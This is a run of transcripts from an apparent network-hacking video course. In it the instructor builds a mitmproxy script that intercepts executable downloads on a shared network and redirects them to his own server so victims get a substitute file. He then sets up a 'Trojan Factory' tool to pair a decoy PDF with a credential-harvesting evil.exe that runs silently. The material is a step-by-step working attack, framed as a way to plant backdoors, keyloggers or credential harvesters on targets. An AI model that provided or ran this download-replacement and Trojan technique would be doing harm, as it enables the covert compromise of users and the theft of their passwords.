00:00:44,410 --> 00:00:46,270
So we have all of this info.

11
00:00:46,840 --> 00:00:54,070
Now what we want to do at this stage is to generate our own response so that whenever someone sends

12
00:00:54,070 --> 00:00:58,060
this request or a request similar to that, that ends with an X.

13
00:00:58,150 --> 00:01:04,630
So whenever someone tries to download something, we want to be able to create a response that will

14
00:01:04,630 --> 00:01:07,810
get them to download something else, a fake file.

15
00:01:07,840 --> 00:01:12,970
Then we can serve them a Trojan, a backdoor, or any file that you want.

16
00:01:13,450 --> 00:01:20,110
So in this lecture we're going to learn how to generate or how to create a custom response.

17
00:01:20,710 --> 00:01:28,480
So whenever we're getting a request that has a URL that ends with a dot x, we want to generate a custom

18
00:01:28,480 --> 00:01:29,380
response.

19
00:01:29,470 --> 00:01:31,030
So let's put that in here.

20
00:01:31,030 --> 00:01:36,880
I'm going to delete this print statement because we actually don't want to print anything and we're

21
00:01:36,880 --> 00:01:41,050
going to use a method from the man in the middle proxy library.

22
00:01:41,050 --> 00:01:48,100
So we're going to do man in the middle proxy dot http dot http response.

23
00:01:49,080 --> 00:01:50,100
Don't make.

24
00:01:51,190 --> 00:01:53,290
And we'll open the brackets for it.

25
00:01:53,830 --> 00:01:57,850
So we're calling Man in the Middle proxy, which we imported in here.

26
00:01:57,880 --> 00:02:01,840
We're calling the Http response object.

27
00:02:01,840 --> 00:02:04,180
And we're saying that we want to make one.

28
00:02:04,660 --> 00:02:10,540
Now, this method, the make method takes three arguments or three inputs if you want to think of it

29
00:02:10,540 --> 00:02:11,260
that way.

30
00:02:11,290 --> 00:02:14,470
So the first input is the Http status.

31
00:02:14,470 --> 00:02:16,060
I'm just going to write them in here.

32
00:02:17,880 --> 00:02:19,620
Followed by the content.

33
00:02:19,650 --> 00:02:25,800
So this is similar to the response body followed by the headers.

34
00:02:27,650 --> 00:02:30,380
So let me move this here to the side.

35
00:02:31,150 --> 00:02:35,020
And let's look at the response here and compare what we're doing.

36
00:02:35,020 --> 00:02:40,810
So this is a valid, legitimate response generated by the server by WinZip server.

37
00:02:40,810 --> 00:02:44,440
And you can see, first of all, it contains a status code.

38
00:02:44,440 --> 00:02:46,660
So this is 200 in this case.

39
00:02:46,690 --> 00:02:52,990
So that is the first argument in here that we have to give to the response method that we need to give

40
00:02:52,990 --> 00:02:56,050
it a Http status code in here.

41
00:02:56,050 --> 00:02:58,240
In this example, it's 200.

42
00:02:59,550 --> 00:03:07,980
Then we need to give it the content, which is in this example in here, the content was the code,

43
00:03:07,980 --> 00:03:09,300
the actual file.

44
00:03:10,300 --> 00:03:13,120
Finally, we have to give it the headers.

45
00:03:13,600 --> 00:03:16,690
And the headers are these fields in here?

46
00:03:16,690 --> 00:03:23,470
So the server, the tag, the last modified, all of these are considered to be headers.

47
00:03:24,380 --> 00:03:26,330
So let's try to fill this in.

48
00:03:26,360 --> 00:03:30,650
The first part that we need to give is the Http status code.

49
00:03:30,680 --> 00:03:35,630
So we need to use an appropriate code that will achieve our goal.

50
00:03:35,630 --> 00:03:43,130
In the example here, they just gave a 200 and then they gave the other headers followed by the content

51
00:03:43,130 --> 00:03:45,140
of the file and the content.

52
00:03:45,770 --> 00:03:52,520
In our example, I actually want to use a different status code and I want to redirect this request

53
00:03:52,520 --> 00:03:55,610
to the location where I have my fake file.

54
00:03:55,910 --> 00:03:59,450
To do that, we have to use the 301.

55
00:03:59,450 --> 00:04:02,060
Moved permanently status code.

56
00:04:02,480 --> 00:04:05,210
Now, I didn't just figure this out myself.

57
00:04:05,210 --> 00:04:12,110
It's a known Http code and I'm going to include this link in the resources for you, which basically

58
00:04:12,110 --> 00:04:16,730
contains all the status codes in here, including the 301.

59
00:04:16,730 --> 00:04:17,960
Moved permanently.

60
00:04:18,410 --> 00:04:24,000
So you can see that this code will redirect to a giving Uri.

61
00:04:24,000 --> 00:04:29,190
So we also have to provide a Uri to redirect the user to.

62
00:04:29,950 --> 00:04:37,480
Now, if we click on the moved permanently, you'll actually get more information about it and you'll

63
00:04:37,480 --> 00:04:39,070
see examples of it.

64
00:04:39,370 --> 00:04:47,920
So you can see, for example, the server would response as 301 moved permanently and then in the header.

65
00:04:47,920 --> 00:04:49,780
So this is an example of a header.

66
00:04:49,810 --> 00:04:55,360
It will contain a location followed by the location that the user should be moved to.

67
00:04:55,480 --> 00:04:56,770
And this is perfect.

68
00:04:56,770 --> 00:04:59,350
This is exactly what we want to achieve.

69
00:04:59,380 --> 00:05:03,850
So all we have to do now is put this in the headers part.

70
00:05:04,300 --> 00:05:06,160
Now let's go back to our code.

71
00:05:07,300 --> 00:05:09,130
And this is the headers part.

72
00:05:09,850 --> 00:05:15,070
In here, we're going to we're going to remove this because that's just me telling you what you should

73
00:05:15,070 --> 00:05:16,040
put in here.

74
00:05:16,090 --> 00:05:21,880
We're going to open two curly brackets like this one, and this will take two parts.

75
00:05:21,880 --> 00:05:28,690
So it will take first of all, the header title followed by a colon, followed by the value.

76
00:05:29,550 --> 00:05:33,960
So if we look in here, you can see, for example, here we have the title server.

77
00:05:33,990 --> 00:05:35,640
The value is Apache.

78
00:05:35,670 --> 00:05:39,270
Here we have the title date and the value is the date.

79
00:05:39,270 --> 00:05:42,480
So these, like I said, are all examples of headers.

80
00:05:42,480 --> 00:05:49,410
But the header that we want to use according to Wikipedia in here, we want to use a header that is

81
00:05:49,410 --> 00:05:55,290
called location and the value is going to be the location where your file is, where the file that you

82
00:05:55,290 --> 00:05:57,090
want to redirect the user to.

83
00:05:57,720 --> 00:06:01,230
So we're going to set the header name to location.

84
00:06:04,350 --> 00:06:10,860
And then we're going to set its value and its value is going to be the location of the file that you

85
00:06:10,860 --> 00:06:13,710
want to replace the target file with.

86
00:06:13,830 --> 00:06:20,980
So in my example, I'm going to be replacing it with a file that's hosted in my own current web server.

87
00:06:21,000 --> 00:06:30,300
So that's going to be at http ten 2258 and the name of the file is actually just file dot x.

88
00:06:31,560 --> 00:06:36,000
And I'll just make this a little bit bigger so we can see the whole code.

89
00:06:37,120 --> 00:06:38,350
And that's it.

90
00:06:38,470 --> 00:06:43,870
Now, one thing that we didn't modify is the content, and we actually don't need to use anything for

91
00:06:43,870 --> 00:06:47,260
that because we're redirecting the user to a different place.

92
00:06:47,260 --> 00:06:51,520
So I'm just going to remove this and just leave it blank like this.

93
00:06:52,150 --> 00:06:52,780
Okay.

94
00:06:52,780 --> 00:06:58,680
Now I know this code might be a little bit confusing, so let's go over it one more time.

95
00:06:58,690 --> 00:07:04,390
So basically the code in here will only be executed on request flows.

96
00:07:04,810 --> 00:07:14,230
We are using a conditional statement that will check if the URL in the flow ends with dot x, then it

97
00:07:14,230 --> 00:07:14,980
will go in here.

98
00:07:14,980 --> 00:07:22,810
So this code in here will only be executed on requests that contain a URL that ends with a dot x, which

99
00:07:22,810 --> 00:07:24,340
is what we're interested in.

100
00:07:25,170 --> 00:07:28,230
First we're going to print got an interesting flow.

101
00:07:28,410 --> 00:07:34,920
Then we are going to going to create a response, a custom response for this flow.

102
00:07:34,950 --> 00:07:38,850
This custom response is calling the man in the middle proxy library.

103
00:07:38,880 --> 00:07:44,940
It's using the Http response object and it's calling a method called make.

104
00:07:44,940 --> 00:07:52,020
So basically, this code in here will make a Http response from the the man in the middle proxy library.

105
00:07:52,170 --> 00:07:56,910
And in here we define the response that we want to use.

106
00:07:57,870 --> 00:08:06,270
We're using a 301 status code because we see that this can be used to redirect the the requested URL

107
00:08:06,300 --> 00:08:07,920
to a different URL.

108
00:08:08,400 --> 00:08:12,540
Then we're setting the headers based on what we've seen on Wikipedia.

109
00:08:12,570 --> 00:08:18,690
We're setting the location to the location of our fake file so that when the user downloads something,

110
00:08:18,690 --> 00:08:20,700
they will get this file instead.

111
00:08:20,850 --> 00:08:23,480
So you can use any URL in here.

112
00:08:23,490 --> 00:08:29,160
It just has to be a direct URL to the file, so it shouldn't be a URL to a HTML page.

113
00:08:29,160 --> 00:08:34,740
So basically if you copy this URL and put it in the browser, they should be able to download this file

114
00:08:34,740 --> 00:08:35,550
directly.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,550 --> 00:00:01,000
All right.

2
00:00:01,030 --> 00:00:07,080
Now that we made our response in here, the response is not being used anywhere.

3
00:00:07,090 --> 00:00:13,600
So man in the middle proxy or the interpreter will come in here whenever there is a request that has

4
00:00:13,600 --> 00:00:18,070
a URL that ends with a dot x, it's creating the response.

5
00:00:18,070 --> 00:00:21,580
But this response is not being used anywhere.

6
00:00:22,090 --> 00:00:27,190
So in order to use this response, all we have to do is just do flow.

7
00:00:28,300 --> 00:00:29,740
Thatrillionesponse.

8
00:00:32,050 --> 00:00:35,080
Equals to this and that's it.

9
00:00:35,350 --> 00:00:43,120
So from the start of writing the script, the main variable that we were doing things with was the flow,

10
00:00:43,120 --> 00:00:45,520
because this is the current flow.

11
00:00:45,550 --> 00:00:50,000
This is all the information it contains, all the information that we need.

12
00:00:50,020 --> 00:00:57,100
So we were filtering it at the start, getting it, checking if the URL ends with a dot x, it does.

13
00:00:57,130 --> 00:01:01,930
Now we need to modify its response because this is our interesting flow.

14
00:01:01,930 --> 00:01:03,940
So this is this flow in here.

15
00:01:04,090 --> 00:01:12,310
We already have its request and if we leave it without modification, the server will respond with this

16
00:01:12,310 --> 00:01:14,920
response right here with the valid file.

17
00:01:14,920 --> 00:01:16,380
So we don't want that.

18
00:01:16,390 --> 00:01:24,610
We created our custom response, which has a 301 redirect, and then we said the flow dot response should

19
00:01:24,610 --> 00:01:28,030
be equal to my new custom response that I just made.

20
00:01:28,330 --> 00:01:30,100
That's all we have to do.

21
00:01:30,100 --> 00:01:30,910
Now.

22
00:01:30,910 --> 00:01:34,580
The request flows will be intercepted by this method in here.

23
00:01:34,580 --> 00:01:35,840
It's going to go in here.

24
00:01:35,840 --> 00:01:41,510
It's going to check if the flow contains a URL that ends with the dot x, it's going to print this line

25
00:01:41,510 --> 00:01:48,290
and then it's going to replace the response for that request with this custom made response in here.

26
00:01:48,740 --> 00:01:49,520
And that's it.

27
00:01:49,520 --> 00:01:50,390
This should work.

28
00:01:50,390 --> 00:01:51,860
So let's save this.

29
00:01:53,680 --> 00:01:57,790
And let's run man in the middle dump with our script.

30
00:01:59,670 --> 00:02:01,170
That's it running here.

31
00:02:01,200 --> 00:02:04,740
Let's go to my web browser.

32
00:02:05,160 --> 00:02:07,560
I'm going to remove the history.

33
00:02:12,420 --> 00:02:14,040
And let's download my file.

34
00:02:16,060 --> 00:02:16,840
Now.

35
00:02:16,840 --> 00:02:23,800
I actually knew this error will happen, but I wanted to show you before I do it so you can see that

36
00:02:23,800 --> 00:02:29,710
we actually got redirected to the page that we're supposed to go to based on our code.

37
00:02:29,710 --> 00:02:35,230
So we actually got redirected to ten, 20 to 15 eight to a file called file dot x.

38
00:02:35,530 --> 00:02:40,960
So we're not going to WinZip server, but this page is not working.

39
00:02:41,200 --> 00:02:46,570
Now let's look at Man in the Middle proxy and see what happens from the start.

40
00:02:47,110 --> 00:02:53,500
So we can see that there was a request to download Dot WinZip and then the file name was WinZip 21 home

41
00:02:53,500 --> 00:02:58,450
dot exe and then that got redirected with a moved permanently.

42
00:02:58,450 --> 00:03:03,340
So this is our own response that we made to this file.

43
00:03:03,430 --> 00:03:05,500
So so far so good.

44
00:03:06,160 --> 00:03:09,550
But then this URL ends with a dot exe.

45
00:03:09,910 --> 00:03:16,520
So based on the condition that we were using, this URL will get moved permanently to the same URL.

46
00:03:16,550 --> 00:03:20,720
We get moved permanently to the same URL and we'll get stuck in this loop.

47
00:03:20,720 --> 00:03:25,430
That's why the browser just stopped and said that the page isn't redirecting properly.

48
00:03:26,150 --> 00:03:30,800
All of this is happening because of the condition that we're using in here.

49
00:03:30,800 --> 00:03:38,060
We're saying if the request flow contains a URL that ends with the dot exe, then redirect it to this.

50
00:03:38,090 --> 00:03:40,280
The redirection contains a dot exe.

51
00:03:40,370 --> 00:03:42,710
So it's going to go back here and here.

52
00:03:42,710 --> 00:03:44,840
And here and here and we'll be stuck.

53
00:03:45,320 --> 00:03:46,790
This is not good.

54
00:03:47,270 --> 00:03:51,590
To fix this, we can modify this condition in here.

55
00:03:51,590 --> 00:03:59,900
This if statement and tell it that I want you to execute this code all the time except when you're being

56
00:03:59,900 --> 00:04:06,380
redirected to this host, except when you're being redirected to the page that I actually want you to

57
00:04:06,380 --> 00:04:07,160
go to.

58
00:04:07,580 --> 00:04:15,290
So to do that, I'm going to add one more condition to this if statement and I'm going to say if the

59
00:04:15,290 --> 00:04:15,980
flow.

60
00:04:17,000 --> 00:04:18,440
Dot request.

61
00:04:19,490 --> 00:04:24,800
Dot host so we were doing Flo dot request dot URL before.

62
00:04:24,800 --> 00:04:33,710
Right now we're saying the Flo dot request dot host and we're going to say if this is not equal to my

63
00:04:33,740 --> 00:04:34,610
IP address.

64
00:04:34,610 --> 00:04:40,010
So if you are redirecting the target to a website, for example to Google, then you're going to say

65
00:04:40,010 --> 00:04:43,700
Iflo dot request dot host is not equal to Google.com.

66
00:04:43,700 --> 00:04:53,360
In my case, the user is, as you can see, is being redirected to http ten 2258 so the host is this

67
00:04:53,360 --> 00:04:54,380
part of the URL?

68
00:04:54,410 --> 00:04:57,620
It's usually what comes after the Http.

69
00:04:57,890 --> 00:05:10,280
So in our case it's ten 2258 so we're saying if the host is not equal to ten 2215 eight.

70
00:05:10,860 --> 00:05:13,620
And the float request.

71
00:05:13,650 --> 00:05:15,990
The URL ends with x.

72
00:05:16,230 --> 00:05:18,450
Then execute this code.

73
00:05:18,930 --> 00:05:23,300
So let's have a look on this condition one more time.

74
00:05:23,310 --> 00:05:28,920
We're saying if the flow dot request dot host is not my IP.

75
00:05:28,920 --> 00:05:38,070
So if it's not the location that I want you to go to and if the flow has a URL that ends with an x,

76
00:05:38,340 --> 00:05:40,830
then redirect it to my location.

77
00:05:41,100 --> 00:05:45,180
So let's take the two possibilities for this if statement.

78
00:05:45,210 --> 00:05:50,610
If we get a flow from any website, the first thing it's going to check the website name is this.

79
00:05:50,610 --> 00:05:50,880
It's.

80
00:05:50,910 --> 00:05:52,380
Is this the domain name?

81
00:05:52,410 --> 00:05:53,330
No.

82
00:05:53,340 --> 00:05:54,810
Then it's going to check.

83
00:05:54,810 --> 00:05:58,740
Also, does it contain a URL that ends with a dot x?

84
00:05:59,070 --> 00:06:01,780
If it doesn't, it will just go to the next flow.

85
00:06:01,800 --> 00:06:05,130
If it does, it will execute this code on it.

86
00:06:05,400 --> 00:06:09,240
Then this code will redirect to a website that contains a dot x.

87
00:06:09,450 --> 00:06:11,080
So we'll come back here.

88
00:06:11,080 --> 00:06:15,940
We're going to check that is the host in this redirection is equal to this?

89
00:06:15,970 --> 00:06:16,750
Yes.

90
00:06:16,750 --> 00:06:18,040
Then it won't go in here.

91
00:06:18,040 --> 00:06:22,390
It won't even run this check in here because this check is false.

92
00:06:22,390 --> 00:06:25,840
And that's why it will leave this if statement.

93
00:06:26,380 --> 00:06:32,200
Note in here the escalation mark followed by equal means, not equal.

94
00:06:32,650 --> 00:06:41,830
So this code will be executed on all requests that contain a URL that ends with a dot x and they are

95
00:06:41,830 --> 00:06:44,020
not going to this host.

96
00:06:44,050 --> 00:06:48,280
They are not going to the host that we want to redirect the user to.

97
00:06:48,670 --> 00:06:54,320
So this is saved now and it automatically reloaded it for me in here.

98
00:06:54,340 --> 00:06:55,720
So let's test it again.

99
00:06:55,720 --> 00:06:57,160
I'm going to go back.

100
00:06:58,130 --> 00:07:00,110
I'm going to delete my history.

101
00:07:04,910 --> 00:07:06,830
And I'm going to download this.

102
00:07:07,890 --> 00:07:08,640
Perfect.

103
00:07:08,670 --> 00:07:12,780
Now, as you can see, I'm actually downloading a file called File.txt.

104
00:07:12,810 --> 00:07:15,350
It's not the WinZip download file.

105
00:07:15,360 --> 00:07:22,320
It's coming from http ten 2258 and it's only four bytes.

106
00:07:22,320 --> 00:07:24,770
So it's definitely not the WinZip program.

107
00:07:24,780 --> 00:07:29,760
This is actually just a test file that I put on my web server just to make sure that this attack will

108
00:07:29,760 --> 00:07:30,420
work.

109
00:07:30,720 --> 00:07:37,140
Now, if we click on okay, this file will get downloaded and if I go to my downloads.

110
00:07:39,760 --> 00:07:41,620
We will see it in here.

111
00:07:42,160 --> 00:07:42,950
So that's it.

112
00:07:42,970 --> 00:07:46,030
Now the attack is running and our script is running.

113
00:07:46,030 --> 00:07:51,640
Now, this script can actually be used to replace any file with any extension.

114
00:07:51,640 --> 00:07:56,860
So you can just put the extension that you want to target in here, for example, a PDF or a PNG or

115
00:07:56,860 --> 00:08:02,230
whatever, and you'll also just have to modify the location in here.

116
00:08:03,740 --> 00:08:09,290
Now, I could have just gave you this script and showed you how to modify it and use it, but I actually

117
00:08:09,290 --> 00:08:15,890
wanted to build it with you step by step so you can use the ideas that I showed you to run any attack

118
00:08:15,890 --> 00:08:19,460
that you want and build your own strong attacks.

119
00:08:19,910 --> 00:08:25,700
Now, I'm actually going to spend one more lecture on this to run the whole thing against a remote computer,

120
00:08:25,700 --> 00:08:29,240
against windows and see how useful that can be.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,910 --> 00:00:08,290
Now, before I show you how to replace downloads on a remote computer, I want to talk about Trojans.

2
00:00:08,710 --> 00:00:15,250
So right now, you know how to replace any file downloaded by any person on the same network with any

3
00:00:15,250 --> 00:00:16,260
other file.

4
00:00:16,270 --> 00:00:22,210
And we said the goal is to replace the file that they're downloading with a file that will do something

5
00:00:22,210 --> 00:00:23,110
useful for you.

6
00:00:23,110 --> 00:00:29,410
So you'd replace it with a backdoor or a keylogger or a credential harvester that sends you the passwords

7
00:00:29,410 --> 00:00:30,430
and so on.

8
00:00:30,910 --> 00:00:36,340
Now this will work and the target is going to probably run your file because they request it to download

9
00:00:36,340 --> 00:00:37,090
something.

10
00:00:37,090 --> 00:00:43,480
But after they run your file, most of these evil files only run in the background so they won't display

11
00:00:43,480 --> 00:00:44,830
anything to the user.

12
00:00:45,130 --> 00:00:49,750
Even if they do display something, they usually just show an error message.

13
00:00:50,110 --> 00:00:53,390
So in that case, the user is going to get suspicious.

14
00:00:53,410 --> 00:00:58,300
Yeah, you get your file running in the background, but you're going to make your target suspicious.

15
00:00:58,990 --> 00:01:06,740
A smarter way of doing this is to replace the file that the target person is downloading with a Trojan.

16
00:01:07,190 --> 00:01:14,570
A Trojan is basically a file that looks and functions just like the normal file that the target is expecting.

17
00:01:14,570 --> 00:01:19,070
So, for example, if the target is downloading a PDF, they'll actually get a PDF.

18
00:01:19,100 --> 00:01:21,950
If they're downloading a song, they'll get a song.

19
00:01:22,100 --> 00:01:27,410
It's going to have a song icon, it's going to have a song extension and it's going to play a song.

20
00:01:27,410 --> 00:01:32,780
So it's going to look and function like a song or like the file that the target is expecting, but at

21
00:01:32,780 --> 00:01:37,100
the same time it will run your evil code in the background.

22
00:01:37,310 --> 00:01:41,180
So let's say your target goes ahead and downloads a PDF.

23
00:01:41,690 --> 00:01:48,110
They're going to get a file that has a PDF icon that when they run it will show a PDF file, but at

24
00:01:48,110 --> 00:01:52,190
the same time your backdoor is going to run at the background.

25
00:01:52,850 --> 00:01:56,480
Now there are a number of ways to create a Trojan.

26
00:01:57,020 --> 00:02:03,650
I explained one in my general ethical hacking course and I explained two in my social engineering course.

27
00:02:04,190 --> 00:02:11,210
Both of the methods that I explain are manual and I go into great details on how to do that in both

28
00:02:11,210 --> 00:02:12,350
of these courses.

29
00:02:12,980 --> 00:02:19,580
I do that because it is very important to know how to generate Trojans when it comes to social engineering.

30
00:02:19,580 --> 00:02:26,180
So it's important for people enrolled in these courses to learn how to do that manually so that they

31
00:02:26,180 --> 00:02:28,760
can create Trojans for different scenarios.

32
00:02:29,270 --> 00:02:34,310
Now, this course is not a social engineering course, and it doesn't even have a small section on social

33
00:02:34,310 --> 00:02:35,090
engineering.

34
00:02:35,120 --> 00:02:36,920
It's a network hacking course.

35
00:02:36,920 --> 00:02:40,940
And therefore, I'm going to show you a quick way of doing it.

36
00:02:41,480 --> 00:02:46,520
We're going to be doing it using a script that I made that actually follows the method, the manual

37
00:02:46,520 --> 00:02:48,890
method that I teach in my other courses.

38
00:02:49,580 --> 00:02:54,980
And this script is actually going to be very useful for another attack that you'll actually have to

39
00:02:54,980 --> 00:02:56,000
use a script for.

40
00:02:56,000 --> 00:02:58,730
And I'll talk about that attack later on in the course.

41
00:02:59,300 --> 00:03:04,310
So right now let me show you how to download this script, install its dependencies, and then we'll

42
00:03:04,310 --> 00:03:06,200
see how to use it in the next lecture.

43
00:03:07,150 --> 00:03:08,800
So I have this script in here.

44
00:03:08,800 --> 00:03:14,200
It's called Trojan Factory, and you can see there is the installation steps in here.

45
00:03:14,680 --> 00:03:20,890
So the first thing that you want to do is download Autoit, which is a scripting language that is used

46
00:03:20,890 --> 00:03:23,620
by the Trojan factory to create the Trojan.

47
00:03:23,770 --> 00:03:26,710
So to do that, we have the link here.

48
00:03:26,740 --> 00:03:29,740
All you have to do is just click on the download link.

49
00:03:31,130 --> 00:03:32,240
Save it.

50
00:03:33,100 --> 00:03:35,200
And now that's gone in the downloads.

51
00:03:36,470 --> 00:03:37,370
To run this.

52
00:03:37,400 --> 00:03:39,860
We have to go to the downloads in here in my terminal.

53
00:03:39,860 --> 00:03:41,630
So we're going to do CD downloads.

54
00:03:44,660 --> 00:03:45,260
If I do.

55
00:03:45,260 --> 00:03:48,260
LS You'll see it in here.

56
00:03:48,590 --> 00:03:50,960
Now that's an X And to run.

57
00:03:50,990 --> 00:03:54,960
EXE files in Linux, you have to use a program called wine.

58
00:03:54,980 --> 00:03:56,690
So we're going to do wine.

59
00:03:57,200 --> 00:04:00,800
Followed by the name of the exe, which is auto it.

60
00:04:01,850 --> 00:04:06,950
I'm going to hit enter and that will show me an installation wizard very similar to the one that you

61
00:04:06,950 --> 00:04:08,990
get when you install stuff on windows.

62
00:04:09,290 --> 00:04:10,850
So we're just going to keep going.

63
00:04:10,850 --> 00:04:11,750
Just go next.

64
00:04:11,780 --> 00:04:12,290
Next.

65
00:04:12,290 --> 00:04:13,310
I agree.

66
00:04:14,670 --> 00:04:18,540
Next install and that's going to install a for me.

67
00:04:20,140 --> 00:04:21,480
Okay, now it's done.

68
00:04:21,490 --> 00:04:28,180
I'm going to uncheck this box to not see the release notes and I'm going to click on Finish and we are

69
00:04:28,180 --> 00:04:28,750
done.

70
00:04:29,470 --> 00:04:33,580
Now that's only installing the requirements by the Trojan factory.

71
00:04:33,580 --> 00:04:36,130
We still have not installed the Trojan factory.

72
00:04:36,520 --> 00:04:44,290
Now to download this, it's hosted on GitHub and as usual, when we want to clone something from GitHub,

73
00:04:44,290 --> 00:04:47,460
all we have to do is come on the green button in here.

74
00:04:47,470 --> 00:04:49,120
Copy the URL.

75
00:04:50,240 --> 00:04:52,390
And then go to my terminal.

76
00:04:52,400 --> 00:04:56,330
I'm going to download it in my opt, so I'm going to do CD.

77
00:04:57,870 --> 00:04:58,410
Opt.

78
00:05:00,070 --> 00:05:03,580
I'm going to do like to see all the programs.

79
00:05:03,760 --> 00:05:06,490
And you can see we have these programs right now.

80
00:05:06,610 --> 00:05:10,690
Now, to download it as usual, again, we're going to do Git Clone.

81
00:05:11,860 --> 00:05:16,870
Followed by the URL of the repo that we just copied and hit enter.

82
00:05:18,800 --> 00:05:19,600
And that's it.

83
00:05:19,610 --> 00:05:20,180
Download it.

84
00:05:20,180 --> 00:05:23,660
So if we do now, we have it right here.

85
00:05:24,320 --> 00:05:26,900
Now we can just see the inside that.

86
00:05:28,960 --> 00:05:36,880
And if we do LHS, we have the file name or the program name in here, which is called Trojan factory.py.

87
00:05:37,780 --> 00:05:42,430
So to run this, just like any other python program, you have to do Python.

88
00:05:43,430 --> 00:05:46,190
Followed by the name of the file that you want to run.

89
00:05:46,190 --> 00:05:48,950
And in my case, it's called Trojan Factory.

90
00:05:49,880 --> 00:05:51,290
I'm going to hit enter.

91
00:05:52,710 --> 00:05:56,760
And as you can see now, it's telling us that I didn't use the program properly.

92
00:05:56,790 --> 00:06:01,530
I need to put dash dash help to see all the options.

93
00:06:03,240 --> 00:06:07,200
And these are all the options that you can use with the program.

94
00:06:07,380 --> 00:06:12,660
Now, using the program is very simple, and I'm going to cover it in the next lecture and we're going

95
00:06:12,660 --> 00:06:16,260
to test the Trojan created by it on the Windows machine.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,090 --> 00:00:01,660
All right.

2
00:00:01,690 --> 00:00:07,870
Now that we have the Trojan factory installed, we can use it to generate a Trojan.

3
00:00:08,320 --> 00:00:14,650
Now, in order to create a Trojan, if you were to do this manually, first you'll have to combine your

4
00:00:14,650 --> 00:00:20,620
evil file, the file that'll do things useful to you with the normal file so the file that the target

5
00:00:20,620 --> 00:00:22,780
person is supposed to see.

6
00:00:23,380 --> 00:00:28,690
Then you have to configure the evil file to make sure that it runs silently in the background without

7
00:00:28,690 --> 00:00:31,150
showing any pop ups to the target user.

8
00:00:31,420 --> 00:00:36,430
You're going to have to change its icon and then you're going to have to change the file extension.

9
00:00:37,000 --> 00:00:43,090
Now the Trojan factory is going to do the first three for us, and changing the extension is up to you

10
00:00:43,090 --> 00:00:47,500
because you have to do that through the file name using the right to left override.

11
00:00:47,740 --> 00:00:54,340
Now, like I said before, I explain how to do all of this manually in both of my general ethical hacking

12
00:00:54,340 --> 00:00:59,260
course, and I actually explained two methods of doing this in my social engineering course.

13
00:00:59,350 --> 00:01:04,330
I'm not going to explain this manually in this course because this is a network hacking course.

14
00:01:04,340 --> 00:01:06,350
It's not a social engineering course.

15
00:01:07,230 --> 00:01:14,160
So right now we have the backdoor factory installed in here, and I already have the help menu in here.

16
00:01:14,700 --> 00:01:17,790
And you can see using the tool is actually very simple.

17
00:01:17,790 --> 00:01:21,510
The tool is designed to make our life easier.

18
00:01:21,510 --> 00:01:24,900
So the first thing that you need to do is run the tool.

19
00:01:24,900 --> 00:01:26,640
So let's write that down.

20
00:01:26,640 --> 00:01:29,640
First, we're going to do Python Trojan Factory.

21
00:01:30,500 --> 00:01:30,830
Okay.

22
00:01:30,830 --> 00:01:32,210
That's the first step done.

23
00:01:33,050 --> 00:01:39,320
The next thing that we need to do is specify a dash F option or front file.

24
00:01:39,500 --> 00:01:45,710
This is the direct URL to the file that the user should see.

25
00:01:46,410 --> 00:01:50,500
So let's try to make our user see a PDF.

26
00:01:50,520 --> 00:01:56,190
So we're going to have to go ahead on the internet and find the PDF that we want to display to the user.

27
00:01:56,190 --> 00:02:01,590
If the PDF that you want to show to your target is not on the internet, then go ahead and upload it

28
00:02:01,590 --> 00:02:06,300
or host it on your own web server and via w-w-w HTML.

29
00:02:06,570 --> 00:02:08,280
Now I'm just going to go on Google.

30
00:02:09,990 --> 00:02:15,900
And I'm going to look for a generic PDF file, so I'm just going to look for a Readme file so that it

31
00:02:15,900 --> 00:02:18,770
kind of works regardless of what the target is looking for.

32
00:02:18,780 --> 00:02:23,820
So even if they're looking, for example, for a research, they'll get a Readme for Acrobat reader

33
00:02:23,820 --> 00:02:28,470
thinking that this pdf is being opened automatically by Acrobat Reader.

34
00:02:28,470 --> 00:02:32,370
So I'm just going to type in Acrobat Reader Readme pdf.

35
00:02:34,250 --> 00:02:34,700
Okay.

36
00:02:34,700 --> 00:02:41,360
Now you can see here in the first result, we have the URL for this file.

37
00:02:42,690 --> 00:02:44,460
So I'm going to copy this.

38
00:02:45,640 --> 00:02:48,010
And let's just open it in a new tab.

39
00:02:51,750 --> 00:02:57,940
Now, as you can see, this takes me directly to the PDF, so it's direct URL.

40
00:02:57,960 --> 00:03:04,740
It ends here with a dot pdf and the page that's loaded is actually the file itself.

41
00:03:04,740 --> 00:03:06,180
It's not a HTML page.

42
00:03:06,180 --> 00:03:08,880
There is no ads, there is nothing on the side.

43
00:03:09,030 --> 00:03:10,860
So this is very important.

44
00:03:10,860 --> 00:03:13,920
Without this the Trojan will not work.

45
00:03:14,720 --> 00:03:17,750
So note in here the word direct URL.

46
00:03:17,870 --> 00:03:22,370
That means the URL should lead you directly to the front file.

47
00:03:22,910 --> 00:03:25,190
So I'm going to do dash f.

48
00:03:26,040 --> 00:03:28,110
And then put the direct URL.

49
00:03:29,710 --> 00:03:34,900
Now, the next option here is the dash E, which is the eval file.

50
00:03:35,320 --> 00:03:39,730
So this is the direct URL to the evil file.

51
00:03:39,940 --> 00:03:43,330
Again, the direct in here is very important.

52
00:03:43,690 --> 00:03:50,950
Now, in our example, I want to run a credential harvester that I have in here, so it's already in

53
00:03:50,950 --> 00:03:52,710
my var ww HTML.

54
00:03:52,720 --> 00:03:56,920
It's already on my web server and I've already started the Apache.

55
00:03:57,310 --> 00:04:06,340
So the URL to this credential harvester is going to be http followed by my IP, which is ten 2258 and

56
00:04:06,340 --> 00:04:09,190
then the file name is evil dot exe.

57
00:04:10,240 --> 00:04:15,190
Now I'm not going to show you how to create a credential harvester in this course that's explained in

58
00:04:15,190 --> 00:04:16,630
my social engineering course.

59
00:04:16,630 --> 00:04:20,860
This is a pure social engineering technique, so there is no need to show it in here.

60
00:04:20,860 --> 00:04:22,480
It'll just be distracting.

61
00:04:22,690 --> 00:04:28,240
By now you should know how to generate a backdoor because I explained that in my network hacking and

62
00:04:28,240 --> 00:04:32,750
in my general ethical hacking course, which are listed in the requirements for this course.

63
00:04:32,750 --> 00:04:39,380
So you can just use your backdoor instead of this evil file, you can basically use any file you want.

64
00:04:39,410 --> 00:04:41,600
It doesn't even have to be an executable.

65
00:04:41,600 --> 00:04:47,420
So for testing, I usually just use two images to make sure that the two files will be executed and

66
00:04:47,420 --> 00:04:50,000
opened when the Trojans executed.

67
00:04:50,780 --> 00:04:54,710
